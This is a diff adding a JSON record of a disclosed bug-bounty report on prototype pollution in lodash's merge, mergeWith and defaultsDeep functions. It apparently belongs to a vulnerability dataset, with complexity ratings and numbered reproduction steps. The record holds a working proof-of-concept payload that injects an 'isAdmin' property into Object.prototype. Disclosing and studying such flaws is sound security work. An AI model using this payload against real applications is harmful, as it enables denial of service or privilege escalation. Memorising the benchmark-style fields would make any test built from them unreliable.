@@ -1,0 +1,46 @@
+{
+    "reported_to": "Node.js third-party modules",
+    "reported_by": "asgerf ",
+    "title": "Prototype pollution attack (lodash / constructor.prototype)",
+    "content": "\nI would like to report a prototype pollution vulnerability in lodash.\nIt allows an attacker to inject properties on Object.prototype.\nModule\nmodule name: lodash\nversion: 4.17.10\nnpm page: https://www.npmjs.com/package/lodash\nModule Description\nThe Lodash library exported as Node.js modules.\nModule Stats\n12M downloads in the last week\nVulnerability\nVulnerability Description\nThis is a variant of this vulnerability:\nhttps://hackerone.com/reports/310443\nThe functions merge, mergeWith, and defaultsDeep can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.\nSteps To Reproduce:\nCraft an object of form {constructor: {prototype: {...}}} and send it to _.merge.\nCode 160 Bytes\n1var _ = require('lodash');\n2var payload = JSON.parse('{\"constructor\": {\"prototype\": {\"isAdmin\": true}}}');\n3_.merge({}, payload);\n4console.log({}.isAdmin); // true\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nImpact\nDenial of service, possibly more depending on the application.\nSee https://hackerone.com/reports/310443\n\n",
+    "severity": [
+        7.0,
+        null
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Uncontrolled Resource Consumption"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1540918740,
+    "report_url": "https://hackerone.com/reports/380873",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "LOW",
+    "vuln_category": "CODE",
+    "steps": [
+        [
+            1,
+            "Require the lodash library in a Node.js environment: `var _ = require('lodash');`"
+        ],
+        [
+            2,
+            "Parse a malicious JSON payload that targets the constructor prototype: `var payload = JSON.parse('{\"constructor\": {\"prototype\": {\"isAdmin\": true}}}');`"
+        ],
+        [
+            3,
+            "Use lodash's merge function to merge the payload into an empty object: `_.merge({}, payload);`"
+        ],
+        [
+            4,
+            "Verify the prototype pollution by checking if the property was added to Object.prototype: `console.log({}.isAdmin); // true`"
+        ]
+    ],
+    "vuln_description": "The vulnerability is a prototype pollution attack in lodash, specifically in the merge, mergeWith, and defaultsDeep functions. By crafting a malicious object that targets the constructor prototype, an attacker can inject or modify properties on Object.prototype, affecting all objects in the application.",
+    "reason": "The attack involves understanding how JavaScript prototypes work and how lodash's merge function processes nested objects. The key insight is recognizing that the merge function does not properly sanitize input, allowing prototype pollution. This is a known pattern in JavaScript security, making the discovery process more straightforward for someone familiar with such vulnerabilities.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": "310443"
+}
